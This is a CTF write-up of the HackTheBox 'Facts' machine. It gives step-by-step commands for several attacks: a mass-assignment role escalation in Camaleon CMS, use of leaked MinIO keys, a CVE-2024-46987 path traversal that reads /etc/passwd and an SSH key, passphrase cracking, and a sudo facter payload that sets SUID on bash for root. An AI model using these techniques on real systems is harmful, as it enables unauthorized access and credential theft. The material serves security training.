# HTB Facts — Full Writeup

**Difficulty:** Medium  
**OS:** Linux  
**Tags:** Web, MinIO, Camaleon CMS, Path Traversal, SSTI, Privilege Escalation

---

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Web Enumeration — Port 80](#web-enumeration--port-80)
3. [MinIO Discovery — Port 54321](#minio-discovery--port-54321)
4. [Camaleon CMS — Admin Access](#camaleon-cms--admin-access)
5. [Privilege Escalation to Admin Role](#privilege-escalation-to-admin-role)
6. [MinIO Credentials Discovery](#minio-credentials-discovery)
7. [Arbitrary File Read — CVE-2024-46987](#arbitrary-file-read--cve-2024-46987)
8. [SSH Access as trivia](#ssh-access-as-trivia)
9. [Privilege Escalation to Root](#privilege-escalation-to-root)
10. [Flags](#flags)

---

## Reconnaissance

Begin with a full TCP port scan to identify open services.

```bash
nmap -p- --min-rate 5000 -T4 10.129.244.96
```

**Results:**

| Port  | Service  | Notes                    |
|-------|----------|--------------------------|
| 22    | SSH      | OpenSSH                  |
| 80    | HTTP     | Nginx 1.26.3 (Ubuntu)    |
| 54321 | Unknown  | Identified as MinIO      |

Add the target to `/etc/hosts`:

```bash
echo "10.129.244.96 facts.htb" >> /etc/hosts
```

---

## Web Enumeration — Port 80

Browsing to `http://facts.htb` reveals a trivia website built on **Camaleon CMS** (Ruby on Rails). Key indicators:

- Cookie name: `_factsapp_session` (Rails session)
- Asset paths: `/assets/themes/camaleon_first/`
- CSRF token in meta tags
- Server: `nginx/1.26.3 (Ubuntu)`

Enumerate the sitemap for all available pages:

```bash
curl -s http://facts.htb/sitemap.xml
```

Notable paths discovered:
- `/admin` → redirects to `/admin/login`
- `/rss`
- Various trivia pages: `/animal-ejected`, `/anne-frank`, etc.

Check for the admin login panel:

```bash
curl -v http://facts.htb/admin
# → 302 redirect to /admin/login
```

---

## MinIO Discovery — Port 54321

Probing the unknown port with curl reveals **MinIO**, an S3-compatible object storage service:

```bash
curl -v http://facts.htb:54321
```

**Response:**
```xml
<Error>
  <Code>AccessDenied</Code>
  <Message>Access Denied.</Message>
</Error>
```

Headers confirm: `Server: MinIO`

Enumerate potential bucket names (all return 403, confirming they exist):

```bash
for bucket in facts backup uploads media files images data private secret admin internal; do
  code=$(curl -s -o /dev/null -w "%{http_code}" http://facts.htb:54321/$bucket)
  echo "$bucket: $code"
done
```

All return `403 Forbidden` — buckets exist but require credentials.

---

## Camaleon CMS — Admin Access

### Identifying the CMS

From the asset paths and session cookie, the CMS is identified as **Camaleon CMS**.

Check for known vulnerabilities:

```bash
searchsploit camaleon
```

**Results:**
```
Camaleon CMS v2.7.0 - Server-Side Template Injection (SSTI)   | ruby/webapps/51489.txt
```

The admin panel version is confirmed as **2.9.0** (visible in the footer after logging in).

### Creating an Account

The admin login page at `http://facts.htb/admin/login` includes a **"Create an account"** link. Register a new account:

- Navigate to `http://facts.htb/admin/users/sign_up`
- Fill in any valid credentials (e.g., `test123` / `test123`)
- Submit — this creates a `Client` role account

After registration, log in to the admin dashboard. The account has limited `Client` privileges.

---

## Privilege Escalation to Admin Role

### Mass Assignment Vulnerability

Camaleon CMS is vulnerable to a **mass assignment** attack on the password change endpoint. By intercepting the password change request and injecting a `password[role]` parameter, an attacker can escalate their own role to `admin`.

**Steps using Burp Suite:**

1. Log in to the admin panel with the `Client` account.
2. Navigate to `Profile → Edit → Change Password`.
3. Enter any new password and click **Process**.
4. Intercept the POST request in Burp Suite.
5. Append `&password[role]=admin` to the request body:

```
_method=patch&authenticity_token=<TOKEN>&password%5Bpassword%5D=test123&password%5Bpassword_confirmation%5D=test123&password[role]=admin
```

6. Forward the request — response should be `200 OK`.
7. Log in again with the updated credentials.

The account now has **admin** privileges, granting full access to the CMS admin panel including `Settings`, `Media`, and `Filesystem Settings`.

---

## MinIO Credentials Discovery

With admin access, navigate to:

```
Settings → General Site → Filesystem Settings
```

The page reveals hardcoded MinIO (AWS S3-compatible) credentials:

```
AWS S3 Access Key:    AKIA59D605615FFC8875
AWS S3 Secret Key:    O8RU3/gJFlfcZAievtTfBaxJbOg5ZOwa0tmIZLWt
AWS S3 Bucket Name:   randomfacts
AWS S3 Region:        us-east-1
AWS S3 Endpoint:      http://localhost:54321
```

Configure AWS CLI and enumerate buckets:

```bash
export AWS_ACCESS_KEY_ID='AKIA59D605615FFC8875'
export AWS_SECRET_ACCESS_KEY='O8RU3/gJFlfcZAievtTfBaxJbOg5ZOwa0tmIZLWt'
export AWS_DEFAULT_REGION='us-east-1'

aws s3 ls --endpoint-url http://facts.htb:54321
```

**Discovered buckets:**
```
2025-09-11  internal
2025-09-11  randomfacts
```

The `internal` bucket contains the home directory of the `trivia` user:

```bash
aws s3 ls s3://internal/ --endpoint-url http://facts.htb:54321
aws s3 ls s3://internal/.ssh/ --endpoint-url http://facts.htb:54321

# Download the SSH private key
aws s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519 --endpoint-url http://facts.htb:54321
```

---

## Arbitrary File Read — CVE-2024-46987

Alternatively, the SSH private key can be retrieved via **CVE-2024-46987**, an authenticated path traversal vulnerability in Camaleon CMS that allows reading arbitrary server files.

Clone the public PoC:

```bash
git clone https://github.com/Goultarde/CVE-2024-46987
cd CVE-2024-46987
```

Read sensitive files:

```bash
# Read /etc/passwd to enumerate users
python CVE-2024-46987.py -u http://facts.htb --user test123 -p test123 /etc/passwd

# Read trivia's SSH private key
python CVE-2024-46987.py -u http://facts.htb --user test123 -p test123 /home/trivia/.ssh/id_ed25519
```

Save the key output to a file:

```bash
chmod 600 id_ed25519
```

---

## SSH Access as trivia

### Cracking the SSH Key Passphrase

The SSH private key is encrypted with a passphrase. Use `ssh2john` and `john` to crack it:

```bash
ssh2john id_ed25519 > ssh.hash
john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Cracked passphrase:** `dragonballz`

### Login via SSH

```bash
ssh -i id_ed25519 trivia@facts.htb
# Enter passphrase: dragonballz
```

Retrieve the user flag:

```bash
cat /home/william/user.txt
```

---

## Privilege Escalation to Root

### Sudo Permissions

Check sudo privileges for the `trivia` user:

```bash
sudo -l
```

**Output:**
```
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

The user can run `/usr/bin/facter` as root without a password. `facter` is a Ruby-based system information tool.

### GTFOBins — facter

According to [GTFOBins](https://gtfobins.github.io/gtfobins/facter/), `facter` can load custom Ruby fact files via `--custom-dir`, which are executed as the invoking user (root in this case).

**Exploit:**

```bash
# Create exploit directory and Ruby payload
mkdir -p /tmp/exploit_facts
cat > /tmp/exploit_facts/evil.rb << 'EOF'
system("chmod +s /bin/bash")
EOF

# Execute facter as root with the custom directory
sudo /usr/bin/facter --custom-dir=/tmp/exploit_facts/ x

# Verify SUID bit is set on bash
ls -la /bin/bash
# -rwsr-sr-x 1 root root ...

# Spawn root shell
/bin/bash -p
```

### Retrieve Root Flag

```bash
whoami
# root

cat /root/root.txt
```

---

## Flags

| Flag      | Location                  |
|-----------|---------------------------|
| user.txt  | `/home/william/user.txt`  |
| root.txt  | `/root/root.txt`          |

---

## Attack Chain Summary

```
Nmap Scan
    ↓
Port 80: Camaleon CMS 2.9.0
    ↓
Register Client Account → Admin Panel
    ↓
Mass Assignment: password[role]=admin → Admin Role
    ↓
Admin Settings → MinIO Credentials Exposed
    ↓
CVE-2024-46987: Path Traversal → Read /home/trivia/.ssh/id_ed25519
    ↓
ssh2john + John → Passphrase: dragonballz
    ↓
SSH Login as trivia
    ↓
sudo facter --custom-dir (GTFOBins) → chmod +s /bin/bash
    ↓
/bin/bash -p → root
```

---

## CVEs and References

| CVE | Description |
|-----|-------------|
| CVE-2024-46987 | Camaleon CMS authenticated path traversal / arbitrary file read |
| CVE-2023-30145 | Camaleon CMS v2.7.0 SSTI via formats parameter (not used in this box) |

- [GTFOBins — facter](https://gtfobins.github.io/gtfobins/facter/)
- [CVE-2024-46987 PoC](https://github.com/Goultarde/CVE-2024-46987)
- [Camaleon CMS GitHub](https://github.com/owen2345/camaleon-cms)
